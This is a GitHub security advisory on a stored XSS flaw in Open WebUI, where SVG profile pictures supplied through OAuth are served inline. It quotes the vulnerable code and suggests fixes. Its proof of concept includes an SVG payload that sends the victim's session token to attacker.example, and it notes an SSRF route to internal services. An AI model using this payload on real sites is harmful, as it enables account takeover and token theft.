# [H] Open WebUI vulnerable to stored XSS via OAuth picture claim stored as SVG data URI in profile_image_url

## Summary
Severity: High
Advisory: GHSA-3wgj-c2hg-vm6q
CWE: CWE-20, CWE-79
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-3wgj-c2hg-vm6q
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.9.5

## Details
# Summary

When a user signs in via OAuth, Open WebUI fetches the `picture` claim URL, infers a MIME type from the URL extension via `mimetypes.guess_type`, and stores `data:<mime>;base64,...` as the user's profile image. The OAuth code path does not go through the `validate_profile_image_url` Pydantic validator that normally restricts profile images to PNG/JPEG/GIF/WebP. A `.svg` URL in the `picture` claim lands in the database as `data:image/svg+xml;base64,...`.

The profile image endpoint `GET /api/v1/users/{id}/profile/image` returns the stored data URI with the attacker-controlled MIME type as `Content-Type` and `Content-Disposition: inline`. Security headers (CSP, `X-Content-Type-Options`) are env-gated and not set by default. An authenticated user navigating directly to that URL gets the SVG as a top-level document, executing `<script>`/`onload` in the same origin and able to read `localStorage.token` → account takeover.

Same class of trust-boundary error as CVE-2025-64496 (trust of untrusted model servers) and CVE-2025-64495 (rich-text XSS). Different sink, different code path.

# Details

## 1. MIME inferred from URL extension, not Content-Type

`backend/open_webui/utils/oauth.py:1336-1345` — `_process_picture_url`:

```python
response = await client.get(picture_url, ...)
if response.status_code == 200:
    picture = response.content
    base64_encoded_picture = base64.b64encode(picture).decode("utf-8")
    guessed_mime_type = mimetypes.guess_type(picture_url)[0]
    if guessed_mime_type is None:
        guessed_mime_type = "image/jpeg"
    return f"data:{guessed_mime_type};base64,{base64_encoded_picture}"
```

No MIME allowlist. The upstream `Content-Type` is ignored. For a URL ending in `.svg`, `mimetypes.guess_type` returns `image/svg+xml`.

## 2. OAuth path bypasses the profile-image validator

`backend/open_webui/utils/validate.py:10-36` defines `validate_profile_image_url`, which only accepts `/user.png`, `/user-mono.png`, and `data:image/{png,jpeg,gif,webp};base64,...`.

This validator is wired into Pydantic form models (`SignupForm`, `UpdateProfileForm`, `UserUpdateForm`), but the OAuth flow at `oauth.py:1536-1540` (existing-user login) and `oauth.py:1556-1574` (new-user signup) writes via `Users.update_user_profile_image_url_by_id` and `Auths.insert_new_auth`, both of which call SQLAlchemy directly (`models/users.py:575-588`) without going through any Pydantic model. The SVG data URI lands in the DB unchallenged.

## 3. Endpoint serves attacker-controlled MIME with `inline` disposition

`backend/open_webui/routers/users.py:504-528` — `get_user_profile_image_by_id`:

```python
header, encoded = image.split(",", 1)
media_type = header.split(";")[0].lstrip("data:")  # "image/svg+xml"
data = base64.b64decode(encoded)
return StreamingResponse(
    iter([data]),
    media_type=media_type,
    headers={"Content-Disposition": "inline"},
)
```

No MIME whitelist. The route requires `get_verified_user` — any authenticated user reaches it.

## 4. No default CSP / nosniff

`backend/open_webui/utils/security_headers.py:16-61` populates headers only when the operator sets the corresponding env var. The default deployment returns none of these. Browsers render a top-level `image/svg+xml` response as an XML document and execute embedded script.

# PoC

**Prerequisites**: operator has OAuth signup enabled (`ENABLE_OAUTH_SIGNUP=true`) or OAuth login with picture sync (`OAUTH_UPDATE_PICTURE_ON_LOGIN=true`). The attacker has a valid identity on the configured IdP and can set their profile picture URL.

1. Attacker hosts a malicious SVG at `https://attacker.example/p.svg`:

```xml
<svg xmlns="http://www.w3.org/2000/svg"
     onload="fetch('https://attacker.example/x?c='+encodeURIComponent(localStorage.getItem('token')))" />
```

2. Attacker sets their IdP profile picture to that URL and signs in to Open WebUI via OAuth. Signup (or login with picture sync) stores `data:image/svg+xml;base64,...` in the attacker's `profile_image_url`.

3. Attacker shares a link to their own profile image with a victim in a chat DM or channel:

```
https://target.example/api/v1/users/<attacker-user-id>/profile/image
```

4. The authenticated victim clicks the link. The browser receives `Content-Type: image/svg+xml` with `Content-Disposition: inline`, renders the SVG as a top-level document, fires `onload`, and exfiltrates the victim's JWT. Attacker uses the JWT to take over the victim's account.

# Impact

- Account takeover of any authenticated user who opens the crafted URL.
- Post-takeover: access to the victim's chats, API keys stored in their settings, and — if the victim has `workspace.tools` permission — RCE via installed tools (per CVE-2025-64496 analysis).
- The same `_process_picture_url` function has no SSRF allowlist; a secondary primitive is to point the `picture` claim at an internal URL (metadata service, internal admin panel) and read the response bytes via the profile image endpoint.

# Suggested fix

1. In `_process_picture_url` (`utils/oauth.py:1336-1345`): reject any MIME outside `{image/png, image/jpeg, image/gif, image/webp}`. Use the upstream `Content-Type` response header, not the URL extension. Also add an SSRF allowlist or at minimum block RFC1918 / link-local / loopback targets.

2. In `get_user_profile_image_by_id` (`routers/users.py:504-528`): enforce a MIME whitelist before building `StreamingResponse`. This is the defense-in-depth layer that should have caught the bypass.

3. Apply `validate_profile_image_url` at the model/storage layer (`Users.update_user_profile_image_url_by_id`), not only at the Pydantic form layer. All write paths to the profile image column should go through the same validator.

4. Set `X-Content-Type-Options: nosniff` and a default CSP unless the operator explicitly disables them.

# References

- `backend/open_webui/utils/oauth.py:1318-1351` — MIME guess + fetch
- `backend/open_webui/utils/oauth.py:1536-1574` — OAuth write path
- `backend/open_webui/utils/validate.py:10-36` — validator (bypassed)
- `backend/open_webui/models/users.py:575-588` — DB write
- `backend/open_webui/routers/users.py:504-528` — serving endpoint
- `backend/open_webui/utils/security_headers.py:16-61` — env-gated headers
- CVE-2025-64496 — precedent: trust boundary error (same class)
- CVE-2025-64495 — precedent: rich-text XSS (same class)

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-3wgj-c2hg-vm6q
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.5
